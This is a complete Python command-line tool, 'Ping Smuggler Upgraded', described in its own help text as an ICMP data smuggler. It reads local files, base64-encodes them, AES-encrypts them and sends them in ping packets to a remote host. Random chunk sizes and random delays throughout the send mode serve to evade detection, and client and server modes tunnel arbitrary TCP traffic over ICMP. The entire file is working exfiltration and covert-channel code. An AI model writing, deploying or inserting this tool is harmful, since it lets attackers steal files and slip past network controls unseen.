#!/usr/bin/env python3
import argparse, os, sys, base64
import time, random, socket, threading
import struct, logging, traceback, getpass
import colorama  # type: ignore
class psuLoggingFormatter(logging.Formatter):
    # "\x1b[1m"+"\x1b[38m"
    black = "\x1b[30m";red = "\x1b[31m";green = "\x1b[32m";yellow = "\x1b[33m"
    blue = "\x1b[34m";gray = "\x1b[38m";reset = "\x1b[0m";bold = "\x1b[1m"
    COLORS = {logging.DEBUG: gray+bold,logging.INFO: blue+bold,logging.WARNING: yellow+bold,logging.ERROR: red,logging.CRITICAL: red+bold,}
    def format(self, record):
        logColor = self.COLORS[record.levelno]
        format = "(black){asctime}(reset) (levelcolor){levelname:<8}(reset) (green){name}(reset) {message}"
        format = format.replace("(black)", self.black + self.bold)
        format = format.replace("(reset)", self.reset)
        format = format.replace("(levelcolor)", logColor)
        format = format.replace("(green)", self.green + self.bold)
        formatter = logging.Formatter(format, "%Y-%m-%d %H:%M:%S", style="{")
        return formatter.format(record)
customLogger = logging.getLogger("PSU")
customLogger.setLevel(logging.DEBUG)
consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(psuLoggingFormatter())
consoleHandler.setLevel(logging.INFO)
customLogger.addHandler(consoleHandler)
class pingSmugglerUpgraded:
    def customLogPipe(self,message:str,level:int=1,exc_info:bool=False,noLog:bool=False):
        prefix_map = {1: "[*] ",3: "[!] ",'output': "[^] "}
        logMap = {0: self.customLogger.debug,'d': self.customLogger.debug,'debug': self.customLogger.debug,1: self.customLogger.info,'i': self.customLogger.info,'info': self.customLogger.info,2: self.customLogger.warning,'w': self.customLogger.warning,'warning': self.customLogger.warning,3: self.customLogger.error,'r': self.customLogger.error,'error': self.customLogger.error,4: self.customLogger.critical,'c': self.customLogger.critical,'critical': self.customLogger.critical}
        prefix = prefix_map.get(level, "")
        logFunc = logMap.get(level, self.customLogger.info)
        if not noLog: logFunc(f"{prefix}{message}", exc_info=exc_info)
    def __init__(self,noConfirmUser:bool=False,app:bool=False):
        self.config = {"noConfirmUser":noConfirmUser};self.history = {};self.customLogger = customLogger;self.customLogPipe("Initializing PSU...");self.customLogPipe("Attempting `scapy` & `cryptography` import...");self._initImports();self.app = app
        self.centralParser = None;self.subParCenteral = None;self.subParSend = None;self.subParRecv = None;self.subParConnect = None;self.subParListen = None;self.subParGenKey = None
        self.args = None;self.FLAG_SYN = 0x01;self.FLAG_FIN = 0x02;self.FLAG_DATA = 0x04;self.CONN_ID_MAX = 65535;self.HEADER_FORMAT = "!HB";self.HEADER_SIZE = struct.calcsize(self.HEADER_FORMAT)
        if self.app: self.parsersInitialized = self._initParsers()
        else: self.parsersInitialized = False
    class tunnelClient:
        def __init__(self,PSUI:callable,key:str,rHost:str,rPort:int,lPort:int,connID:int=None):
            self.psu = PSUI;self.key = key;self.rHost = rHost;self.rPort = rPort;self.lPort = lPort;self.sessions = {};self.history = {};self.connIDCounter = random.randint(1,1024);self.lock = threading.Lock();self.running = False
            self.psu.customLogPipe(f"Initialized `tunnelClient` module, rHost: '{self.rHost}:{self.rPort}', Local port: '{self.lPort}' / '{str(self.key)[:5]}...'.")
        def _encryptPayload(self,data):
            iv = os.urandom(16)
            cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend())
            encryptor = cipher.encryptor()
            return iv + (encryptor.update(data) + encryptor.finalize())
        def _decryptPayload(self,encPayload):
            try:
                iv = encPayload[:16]
                ciphertext = encPayload[16:]
                cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend())
                decryptor = cipher.decryptor()
                return decryptor.update(ciphertext) + decryptor.finalize()
            except Exception as E:
                self.psu.customLogPipe(f"Caught exception while attempting to decrypt a payload: '{str(E)}'.",level=3)
                return None
        def _listenLocal(self):
            localServer = socket.socket(socket.AF_INET,socket.SOCK_STREAM);localServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);localServer.bind(('127.0.0.1',self.lPort));localServer.listen(5)
            self.psu.customLogPipe(f"Local listener started on port {self.lPort}.")
            try:
                while self.running:
                    try:
                        clientSock, clientAddr = localServer.accept()
                        with self.lock:
                            self.connIDCounter = (self.connIDCounter + 1) % self.psu.CONN_ID_MAX
                            connID = self.connIDCounter
                            self.sessions[connID] = {'sock': clientSock, 'rAddr': clientAddr}
                        threading.Thread(target=self._handleLocalClient, args=(connID,), daemon=True).start()
                        synPacket = scapyIP(dst=self.rHost) / scapyICMP() / self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_SYN))
                        scapySend(synPacket, verbose=False)
                        self.psu.customLogPipe(f"Sent SYN for connection ID {connID}.")
                    except socket.timeout:
                        continue
            except KeyboardInterrupt:
                self.psu.customLogPipe("Local listener interrupted.")
            finally:
                localServer.close()
        def _handleLocalClient(self,connID):
            with self.lock:
                if connID not in self.sessions: return
                clientSock = self.sessions[connID]['sock']
            try:
                while self.running:
                    data = clientSock.recv(4096)
                    if not data: break
                    encPacket = self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_DATA) + data);packet = scapyIP(dst=self.rHost) / scapyICMP() / encPacket;scapySend(packet, verbose=False);self.psu.customLogPipe(f"Sent DATA packet for connection {connID}.")
            except Exception as E:
                self.psu.customLogPipe(f"Error handling client for connection {connID}: '{str(E)}'.",level=3)
            finally:
                with self.lock:
                    if connID in self.sessions:
                        try: self.sessions[connID]['sock'].close()
                        except: pass
                        del self.sessions[connID]
                finPacket = scapyIP(dst=self.rHost) / scapyICMP() / self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_FIN))
                scapySend(finPacket, verbose=False)
                self.psu.customLogPipe(f"Sent FIN for connection {connID}.")
        def _listenICMP(self):
            def processICMPResponse(packet):
                if not packet.haslayer(scapyICMP) or not packet.haslayer(scapyIP):
                    return
                try:
                    encPayload = bytes(packet[scapyICMP].payload)
                    decPayload = self._decryptPayload(encPayload)
                    if not decPayload or len(decPayload) < self.psu.HEADER_SIZE:
                        return
                    connID, flags = struct.unpack(self.psu.HEADER_FORMAT, decPayload[:self.psu.HEADER_SIZE])
                    data = decPayload[self.psu.HEADER_SIZE:]
                    with self.lock:
                        if connID in self.sessions and (flags & self.psu.FLAG_DATA):
                            try:
                                self.sessions[connID]['sock'].sendall(data)
                                self.psu.customLogPipe(f"Sent data to local client for connection {connID}.")
                            except: pass
                except: pass
            scapySniff(filter='icmp', prn=processICMPResponse, store=0)
        def start(self):
            self.running = True;self.psu.customLogPipe("Starting tunnel client...");listenerThread = threading.Thread(target=self._listenLocal, daemon=True);icmpThread = threading.Thread(target=self._listenICMP, daemon=True);listenerThread.start();icmpThread.start()
            try:
                listenerThread.join()
            except KeyboardInterrupt:
                self.psu.customLogPipe("Tunnel client stopped.")
                self.running = False
    class tunnelServe:
        def __init__(self,PSUI:callable,key:str,rHost:str,rPort:int):
            self.psu = PSUI;self.key = key;self.rHost = rHost;self.rPort = rPort;self.sessions = {};self.history = {};self.lock = threading.Lock()
            self.psu.customLogPipe(f"Initialized `tunnelServe` module, rHost: '{self.rHost}:{self.rPort}' / '{str(self.key)[:5]}...'.")
        def _encryptPayload(self,data):
            iv = os.urandom(16)
            cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend())
            encryptor = cipher.encryptor()
            return iv + (encryptor.update(data) + encryptor.finalize())
        def _forwardData(self,connID,data):
            with self.lock:
                session = self.sessions.get(connID)
                if not session: return
            header = struct.pack(self.psu.HEADER_FORMAT,connID,self.psu.FLAG_DATA)
            encPayload = self._encryptPayload(header+data)
            packet = scapyIP(dst=session['rAddr']) / scapyICMP() / encPayload
            scapySend(packet,verbose=False)
            self.psu.customLogPipe(f"Forwarded encrypted data '{str(encPayload)[:5]}...' to '{str(session['rAddr'])}'.")
        def _handleSock(self,connID):
            with self.lock: sock = self.sessions[connID]['sock']
            while True:
                try:
                    data = sock.recv(4096)
                    if not data: break
                    self._forwardData(connID,data)
                except Exception as E:
                    self.psu.customLogPipe(f"Caught exception while attempting to handle connection ID '{connID}': '{str(E)}'.",level=3)
                    break
            with self.lock:
                if connID in self.sessions:
                    self.sessions[connID]['sock'].close()
                    del(self.sessions[connID])
                    self.psu.customLogPipe(f"Closed tunnel session '{connID}'.")
        def _decryptPayload(self,encPayload):
            try:
                iv = encPayload[:16]
                ciphertext = encPayload[16:]
                cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend())
                decryptor = cipher.decryptor()
                return decryptor.update(ciphertext) + decryptor.finalize()
            except Exception as E:
                self.psu.customLogPipe(f"Caught exception while attempting to decrypt a payload: '{str(E)}'.",level=3)
                return None
        def _processPackets(self,packet):
            if not packet.haslayer(scapyICMP) or not packet.haslayer(scapyIP): return
            rAddr = packet[scapyIP].src
            decPayload = self._decryptPayload(bytes(packet[scapyICMP].payload))
            if not decPayload or len(decPayload) < self.psu.HEADER_SIZE: return
            connID,flags = struct.unpack(self.psu.HEADER_FORMAT,decPayload[:self.psu.HEADER_SIZE])
            data = decPayload[self.psu.HEADER_SIZE:]
            with self.lock:
                if flags & self.psu.FLAG_SYN and connID not in self.sessions:
                    self.psu.customLogPipe(f"New tunnel connection (SYN) from '{str(rAddr)}' with ID '{connID}'.")
                    try:
                        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        sock.connect((self.rHost,self.rPort))
                        self.sessions[connID]={"rAddr":rAddr,"sock":sock}
                        threading.Thread(target=self._handleSock,args=(connID,),daemon=True).start()
                    except Exception as E:
                        self.psu.customLogPipe(f"Failed to connect to remote host '{str(self.rHost)}:{str(self.rPort)}' due to unknown exception: '{str(E)}'.",level=3)
                        finPacket = scapyIP(dst=rAddr) / scapyICMP() / self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_FIN))
                        scapySend(finPacket, verbose=False)
                elif flags & self.psu.FLAG_DATA and connID in self.sessions:
                    try: self.sessions[connID]['sock'].sendall(data)
                    except Exception as E: pass
                elif flags & self.psu.FLAG_FIN and connID in self.sessions:
                    self.psu.customLogPipe(f"Closing tunnel connection (FIN) for ID '{connID}'.")
                    self.sessions[connID]['sock'].close()
                    del(self.sessions[connID])
        def start(self):
            self.psu.customLogPipe(f"Spawning tunnel server listening for ICMP packets...")
            self.psu.customLogPipe(f"Forwarding traffic to '{str(self.rHost)}:{str(self.rPort)}'.")
            try:
                scapySniff(filter='icmp',prn=self._processPackets,store=0)
            except KeyboardInterrupt:
                self.psu.customLogPipe("Caught keyboard interrupt.")
            except Exception as E:
                eM = f"Caught unknown exception while attempting to listen for ICMP traffic: '{str(E)}'."
                self.psu.customLogPipe(eM)
                raise Exception(eM)
    class recv:
        def __init__(self, PSUI, key, base=None, outputFile=None, outputCap=None):
            self.psu = PSUI
            self.key = key
            self.base = base if base else os.getcwd()
            self.outputFile = outputFile
            self.outputPCap = outputCap
            self.pCount = 0
            self.processedPackets = set()
            self.dataCompiled = b''
            self.stop_event = threading.Event()
            self.sniffer_thread = None
            self.lock = threading.Lock()
            if not os.path.exists(self.base): os.makedirs(self.base, exist_ok=True)
            self.psu.customLogPipe(f"Base directory: {self.base}")
            if self.outputFile:
                self.outputPath = os.path.join(self.base, self.outputFile)
                self.psu.customLogPipe(f"Output file path: {self.outputPath}")
                with open(self.outputPath, "wb") as f: f.write(b'')
            if self.outputPCap:
                self.pcapPath = os.path.join(self.base, self.outputPCap)
                self.psu.customLogPipe(f"PCAP file path: {self.pcapPath}")
        def _decryptChunk(self, encData):
            try:
                if not encData or len(encData) < 16:
                    self.psu.customLogPipe(f"Encrypted data invalid: {len(encData) if encData else 0} bytes", level=0)
                    return None
                iv = encData[:16]
                ciphertext = encData[16:]
                self.psu.customLogPipe(f"Decrypting chunk: IV length={len(iv)}, Ciphertext length={len(ciphertext)}", level=0)
                cipher = cryptCipher(cryptAlgo.AES(self.key), cryptModes.CBC(iv), backend=cryptDefaultBackend())
                decryptor = cipher.decryptor()
                padded = decryptor.update(ciphertext) + decryptor.finalize()
                unpadder = cryptPadding.PKCS7(128).unpadder()
                data = unpadder.update(padded) + unpadder.finalize()
                self.psu.customLogPipe(f"Successfully decrypted chunk: {len(data)} bytes", level=0)
                return data
            except Exception as E:
                self.psu.customLogPipe(f"Decryption failed: {str(E)}", level=3, exc_info=True)
                return None
        def _extractICMPPayload(self, packet):
            try:
                if not packet.haslayer(scapyICMP):
                    return None
                icmp_layer = packet[scapyICMP]
                if icmp_layer.payload is None or len(icmp_layer.payload) == 0:
                    self.psu.customLogPipe(f"ICMP payload is empty", level=0)
                    return None
                payload_data = bytes(icmp_layer.payload)
                self.psu.customLogPipe(f"Extracted ICMP payload: {len(payload_data)} bytes", level=0)
                return payload_data
            except Exception as E:
                self.psu.customLogPipe(f"Failed to extract ICMP payload: {str(E)}", level=3, exc_info=True)
                return None
        def _processPackets(self, packet):
            if self.stop_event.is_set(): return
            with self.lock:
                try:
                    if not packet.haslayer(scapyICMP):
                        return
                    src_ip = packet[scapyIP].src if packet.haslayer(scapyIP) else 'unknown'
                    self.psu.customLogPipe(f"Received ICMP packet from {src_ip}", level=1)
                    icmpData = self._extractICMPPayload(packet)
                    if not icmpData:
                        self.psu.customLogPipe(f"No valid payload extracted", level=3)
                        return
                    if icmpData not in self.processedPackets:
                        self.processedPackets.add(icmpData)
                        decData = self._decryptChunk(icmpData)
                        if decData:
                            self.pCount += 1
                            self.psu.customLogPipe(f"Decrypted chunk ({self.pCount}): {len(decData)} bytes", level=1)
                            self.dataCompiled += decData
                            if self.outputFile:
                                try:
                                    with open(self.outputPath, "ab") as f:
                                        f.write(decData)
                                        f.flush()
                                    self.psu.customLogPipe(f"Wrote {len(decData)} bytes to {self.outputPath}", level=0)
                                except Exception as E:
                                    self.psu.customLogPipe(f"Failed to write to file: {str(E)}", level=3, exc_info=True)
                            if self.outputPCap:
                                try:
                                    scapyWRPcap(self.pcapPath, packet, append=True)
                                    self.psu.customLogPipe(f"Saved packet to PCAP", level=0)
                                except Exception as E:
                                    self.psu.customLogPipe(f"Failed to save PCAP: {str(E)}", level=3)
                        else:
                            self.psu.customLogPipe(f"Decryption returned None for packet", level=3)
                    else:
                        self.psu.customLogPipe(f"Duplicate packet detected, skipping", level=0)
                except Exception as E:
                    self.psu.customLogPipe(f"Error processing packet: {str(E)}", level=3, exc_info=True)
        def _sniff_worker(self, timeout=None, count=0):
            try:
                self.psu.customLogPipe(f"Sniffer thread started", level=1)
                if timeout is None:
                    timeout = 0
                start_time = time.time()
                packets_captured = 0
                while not self.stop_event.is_set():
                    if timeout > 0 and (time.time() - start_time) >= timeout:
                        self.psu.customLogPipe(f"Capture timeout reached", level=1)
                        break
                    if count > 0 and packets_captured >= count:
                        self.psu.customLogPipe(f"Capture count reached: {packets_captured}/{count}", level=1)
                        break
                    try:
                        packets = scapySniff(filter="icmp", prn=self._processPackets, timeout=1, count=0, store=True)
                        packets_captured += len(packets)
                    except KeyboardInterrupt:
                        self.stop_event.set()
                        break
                    except Exception as E:
                        if not self.stop_event.is_set():
                            self.psu.customLogPipe(f"Sniff iteration error: {str(E)}", level=2)
            except Exception as E:
                self.psu.customLogPipe(f"Sniffer worker error: {str(E)}", level=3, exc_info=True)
            finally:
                self.stop_event.set()
                self.psu.customLogPipe(f"Sniffer thread stopped", level=1)
        def start(self, timeout=10, count=0):
            self.psu.customLogPipe(f"Starting packet capture (timeout={timeout}, count={count})", level=1)
            self.stop_event.clear()
            self.sniffer_thread = threading.Thread(target=self._sniff_worker, args=(timeout, count), daemon=False)
            self.sniffer_thread.start()
            try:
                while self.sniffer_thread.is_alive():
                    self.sniffer_thread.join(timeout=0.5)
            except KeyboardInterrupt:
                self.psu.customLogPipe("Caught `KeyboardInterrupt`.", level=1)
                self.stop_event.set()
                self.sniffer_thread.join(timeout=2)
            finally:
                self.stop_event.set()
                if self.sniffer_thread.is_alive():
                    self.sniffer_thread.join(timeout=1)
                self.psu.customLogPipe(f"Finalized and received {self.pCount} packets.", level=1)
                if self.dataCompiled:
                    try:
                        decoded_data = base64.b64decode(self.dataCompiled)
                        self.psu.customLogPipe(f"Total data received: {len(self.dataCompiled)} bytes (encoded), {len(decoded_data)} bytes (decoded)", level=1)
                    except Exception as E:
                        self.psu.customLogPipe(f"Failed to base64 decode: {str(E)}", level=3)
                else:
                    self.psu.customLogPipe(f"No data received.", level=1)
            return (self.pCount, self.processedPackets, self.dataCompiled)
    class send:
        def __init__(self,PSUI:callable,rHost:str,key:str,filePath:str=None,data:str|bytes=None,chunkSize:int=32,delay:int=0,randomSize:bool=False,icmpType:int=8):
            self.psu = PSUI
            self.rHost = rHost
            self.key = key
            self.filePath = filePath
            self.data = data
            self.chunkSize = chunkSize
            self.delay = delay
            self.randomSize = randomSize
            self.icmpType = icmpType
            self.psu.customLogPipe(f"Initialized `send` module, host '{str(rHost)}':'{str(key)[:5]}...'")
        def _getDataToSend(self):
            raw = b''
            if self.data:
                if not isinstance(self.data,bytes): raw = str(self.data).encode("utf-8")
                else: raw = self.data
            elif self.filePath:
                try:
                    self.psu.customLogPipe(f"Attempting to read file '{str(self.filePath)}'.")
                    with open(self.filePath,"rb") as f: raw = f.read()
                except FileNotFoundError:
                    self.psu.customLogPipe(f"Operation failed, could not open file '{str(self.filePath)}'.",level=3)
                    raise FileExistsError
            if not raw:
                self.psu.customLogPipe(f"Exception: No data was resolved to send.",level=3)
                raise ValueError(f"Either `send.data` or `send.filePath` resolved in not data or resolved `falsy`: {str(self.data)} // {str(self.filePath)}")
            ogSize = len(raw)
            ecData = base64.b64encode(raw)
            self.psu.customLogPipe(f"Raw data payload: '{str(raw)}'({str(ogSize)}/bytes) Encoded '{str(ecData)}'({str(len(ecData))}/bytes).")
            return ecData
        def _encryptChunk(self,chunk):
            padder = cryptPadding.PKCS7(128).padder()
            padded = padder.update(chunk)+padder.finalize()
            iv = os.urandom(16)
            cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded)+encryptor.finalize()
            return iv + ciphertext
        def _chunkData(self,data):
            chunks = []
            i = 0
            while i < len(data):
                if self.randomSize: size = random.randint(1,self.chunkSize)
                else: size = self.chunkSize
                chunk = data[i:i+size]
                chunks.append(chunk)
                i += len(chunk)
            return chunks
        def start(self):
            sendData = self._getDataToSend()
            chunks = self._chunkData(sendData)
            self.psu.customLogPipe(f"Attempting to send {len(chunks)} ICMP packets.")
            for idx,chunk in enumerate(chunks):
                encryptedChunk = self._encryptChunk(chunk)
                packet = scapyIP(dst=self.rHost) / scapyICMP(type=self.icmpType) / encryptedChunk
                scapySend(packet,verbose=False)
                self.psu.customLogPipe(f"Sent chunk '{idx+1}' of '{len(chunks)}' ({len(chunk)} bytes).")
                if self.delay > 0:
                    sleep = random.uniform(0,self.delay)
                    time.sleep(sleep)
            self.psu.customLogPipe("Operation completed.")
    def _initParsers(self):
        self.customLogPipe("Attempting to initialize parsers (User-Interface Execution).", level='output')
        self.centralParser = argparse.ArgumentParser(description="An Evolved ICMP Data Smuggler.")
        self.subParCenteral = self.centralParser.add_subparsers(dest="mode",required=True,help="The desired mode of operation.")
        self.subParSend = self.subParCenteral.add_parser("send",help="Send data/files.")
        self.subParInputGroup = self.subParSend.add_mutually_exclusive_group(required=True)
        self.subParInputGroup.add_argument("-f","--file",dest="filePath",help="The path to the file to send.")
        self.subParInputGroup.add_argument("-d","--data",dest="dataStr",help="A string of data to send.")
        self.subParSend.add_argument("rHost",help="Destination Host(IP).")
        self.subParSend.add_argument("key",help='AES Key (16,24 or 32 bytes).')
        self.subParSend.add_argument("-cS","--chunk-size",type=int,default=32,help="The base size of data chunks in bytes (Default: 32).")
        self.subParSend.add_argument("--delay",type=float,default=0,help="Maximum random delay between packets in seconds (Default: 0).")
        self.subParSend.add_argument("-rS","--random-size",action="store_true",help="Use random chunk sizes up to `--chunk-size`.")
        self.subParSend.add_argument("-iS","--icmp-type",type=int,default=8,help="ICMP type to use (Default: 8, Echo Request).")
        self.subParRecv = self.subParCenteral.add_parser("recv",help="Recieve a file.")
        self.subParRecv.add_argument("key",help="AES Key (16, 24, or 32 bytes).")
        self.subParRecv.add_argument("outputFile",help="The output file.")
        self.subParRecv.add_argument("pcapOutput",help="The output PCAP file.")
        self.basePath = os.path.join(str(os.getcwd()),"PSUOut")
        self.subParRecv.add_argument("-b","--base",type=str,default=str(self.basePath),help=f"Base path for the output to stream to (Default: '{str(self.basePath)}').")
        self.subParListen = self.subParCenteral.add_parser("listen",help="Listen for tunneled TCP traffic.")
        self.subParListen.add_argument("key",help="AES Key (16, 24, or 32 bytes).")
        self.subParListen.add_argument("rHost",help="The real destination host to forward to.")
        self.subParListen.add_argument("rPort",type=int,help="The real destination port.")
        self.subParConnect = self.subParCenteral.add_parser("connect",help="Tunnel local TCP traffic over ICMP.")
        self.subParConnect.add_argument("key",help="AES Key (16, 24, or 32 bytes).")
        self.subParConnect.add_argument("rHost",help="The tunnel server (listening) host.")
        self.subParConnect.add_argument("lPort",type=int,help="The local port to listen on.")
        self.subParConnect.add_argument("rPort",type=int,help="The remote port on the target host.")
        self.subParGenKey = self.subParCenteral.add_parser("key-gen",help="Generate an AES key.")
        self.subParGenKey.add_argument("-s","--size",type=int,default=16,choices=[16,24,32],help="Key size in bytes (16, 24, or 32).")
        self.args = self.centralParser.parse_args()
        return True
    def _initImports(self):
        global cryptCipher, cryptAlgo, cryptModes, cryptDefaultBackend, cryptPadding
        global scapyIP, scapyICMP, scapySend, scapySniff, scapyWRPcap
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as cryptCipher # type: ignore
            from cryptography.hazmat.primitives.ciphers import algorithms as cryptAlgo # type: ignore
            from cryptography.hazmat.primitives.ciphers import modes as cryptModes # type: ignore
            from cryptography.hazmat.backends import default_backend as cryptDefaultBackend # type: ignore
            from cryptography.hazmat.primitives import padding as cryptPadding # type: ignore
            from scapy.all import IP as scapyIP # type: ignore
            from scapy.all import ICMP as scapyICMP # type: ignore
            from scapy.all import send as scapySend # type: ignore
            from scapy.all import sniff as scapySniff # type: ignore
            from scapy.all import wrpcap as scapyWRPcap # type: ignore
            self.customLogPipe("Successfully imported `scapy` & `cryptography`.")
        except ImportError as E:
            self.customLogPipe(f"Failed to import required modules: '{str(E)}'.", level=3)
            if not self._getUserPrompt("Required modules are missing. Do you want to install them?"):
                self.customLogPipe("User aborted. Exiting...", level=3)
                sys.exit(1)
            self.customLogPipe("Attempting requirements installation...")
            out = os.popen(f"{sys.executable} -m pip install -r requirements.txt").read()
            self.customLogPipe(f"Requirements installation finished. Please restart the script. Output:\n{str(out)}")
            exit(1)
        except Exception as E:
            self.customLogPipe(f"Unknown exception while attempting to import modules: '{str(E)}' : {str(traceback.format_exc())}", level=3)
            sys.exit(1)
    def _getUserPrompt(self, message: str):
        if not self.config['noConfirmUser']:
            uIn = input(f"(PSU:User-Confirmation) {message} (Y/N)?:> ").lower()
            if uIn not in ["y","yes","affirm"]: return False
            else: return True
        else: return True
    def run(self):
        if not self.parsersInitialized:
            self.customLogPipe("Parsers not initialized. Cannot run.", level=3);return
        args = self.args
        if args.mode == 'send':
            if len(args.key) not in [16, 24, 32]:
                self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            if args.filePath and not os.path.isfile(args.filePath):
                self.customLogPipe(f"Error: File '{args.filePath}' not found.", level=3);sys.exit(1)
            try:
                key = bytes.fromhex(args.key)
                if len(key) not in [16, 24, 32]:
                    self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            except ValueError:
                self.customLogPipe("Error: Key must be a valid hex string.", level=3);sys.exit(1)
            sender = self.send(self, args.rHost, key, filePath=args.filePath, data=args.dataStr, chunkSize=args.chunk_size, delay=args.delay, randomSize=args.random_size, icmpType=args.icmp_type);sender.start()
        elif args.mode == 'recv':
            if len(args.key) not in [16, 24, 32]:
                self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            if not os.path.exists(args.base):
                os.makedirs(args.base, exist_ok=True)
            try:
                key = bytes.fromhex(args.key)
                if len(key) not in [16, 24, 32]:
                    self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            except ValueError:
                self.customLogPipe("Error: Key must be a valid hex string.", level=3);sys.exit(1)
            receiver = self.recv(self, key, base=args.base, outputFile=args.outputFile, outputCap=args.pcapOutput);receiver.start(timeout=30)
        elif args.mode == 'listen':
            if len(args.key) not in [16, 24, 32]:
                self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            try:
                key = bytes.fromhex(args.key)
                if len(key) not in [16, 24, 32]:
                    self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            except ValueError:
                self.customLogPipe("Error: Key must be a valid hex string.", level=3);sys.exit(1)
            server = self.tunnelServe(self, key, args.rHost, args.rPort);server.start()
        elif args.mode == 'connect':
            if len(args.key) not in [16, 24, 32]:
                self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            try:
                key = bytes.fromhex(args.key)
                if len(key) not in [16, 24, 32]:
                    self.customLogPipe("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.", level=3);sys.exit(1)
            except ValueError:
                self.customLogPipe("Error: Key must be a valid hex string.", level=3);sys.exit(1)
            client = self.tunnelClient(self, key, args.rHost, args.rPort, args.lPort);client.start()
        elif args.mode == 'key-gen':
            key = os.urandom(args.size)
            self.customLogPipe(f"Generated {args.size}-byte AES key: {key.hex()}", level='output')
            print(f"- AES-KEY({str(args.size)}): `{str(key.hex())}`")
            sys.exit(0)
def raiseBanner():
    banner = [
        '*-- PSU (Ping Smuggler Upgraded ) --*',
        '=====================================',
        '╔SRC╗                        ╔DST╗═╗ ',
        '║▓▓▓║─AES─┐            ┌─AES─║▓▓▓║R║ ',
        '╚═══╝     │ ╔[TUNNEL]╗ │     ╚═══╝O║ ',
        '          ├╱║░▒▒▒▒▒░║╲├           O║ ',
        '       >>─╬─║▓CRYPT▓║─╬─>>        T║ ',
        '          ╲ ║░▒▒▒▒▒░║ ╱           ≛║ ',
        '           ╲╚═[SEC]═╝╱            ▓║ ',
        '             └─PASS─┘             ╚╝ ',
        '======================================',
        f"{colorama.Fore.CYAN}Author: {colorama.Fore.LIGHTYELLOW_EX}J4ck3LSyN{colorama.Fore.RESET}",
        f"{colorama.Fore.CYAN}Credit: {colorama.Fore.LIGHTYELLOW_EX}0x7sec{colorama.Fore.RESET}",
        "======================================"
    ];banner = "\n".join(banner)
    for i in ["AES", "TUNNEL", "CRYPT","SEC","PASS","DST","SRC"]:
        banner = banner.replace(i,f"{colorama.Fore.RED}{i}{colorama.Fore.RESET}")
    for i in ["R║","O║","T║"]:
        banner = banner.replace(i,f"{colorama.Fore.LIGHTMAGENTA_EX}{i[0]}{colorama.Fore.RESET}║")
    for i in ['▒','░']: banner = banner.replace(i,f"{colorama.Style.DIM}{colorama.Fore.BLUE}{i}{colorama.Style.RESET_ALL}")
    for i in ['▓','▓']: banner = banner.replace(i,f"{colorama.Style.DIM}{colorama.Fore.MAGENTA}{i}{colorama.Style.RESET_ALL}")
    print(str(banner))
if __name__ == "__main__":
    colorama.init()
    raiseBanner()
    psu = pingSmugglerUpgraded(app=True)
    psu.run()
